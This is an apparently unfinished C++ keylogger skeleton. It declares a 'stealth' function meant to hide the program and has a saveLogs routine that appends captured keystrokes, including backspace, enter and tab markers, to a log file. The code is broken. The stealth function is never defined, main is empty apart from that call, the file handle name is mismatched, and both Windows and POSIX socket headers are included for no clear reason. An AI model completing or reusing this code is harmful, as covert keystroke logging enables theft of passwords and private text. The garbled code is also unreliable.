#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <cstring>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <windows.h>
#include <winuser.h>

int saveLogs(int key_stroke, char *file);
void stealth(); // Declare Stealth function to make your keylogger hidden

int main(int argc, char *argv[]) {
	stealth(); // Calls stealth function
	char i;


}

int saveLogs(int key_stroke, char *file) {
	if ((key_stroke == 1) || (key_stroke == 2)) {
		return 0;
	}

	FILE *output_file;
	output_file = fopen(file, "a");

	cout << key_stroke << endl;

	if (key_stroke == 8) {
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	} else if (key_stroke == 13) {
		fprintf(OUTPUT_FILE, "%s", "n");
	} else if (key_stroke == 32) {
		fprintf(OUTPUT_FILE, "%s", " ");
	} else if (key_stroke == VK_TAB) {
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	} else if (key_stroke == VK_CONTROL) {
		
	}
}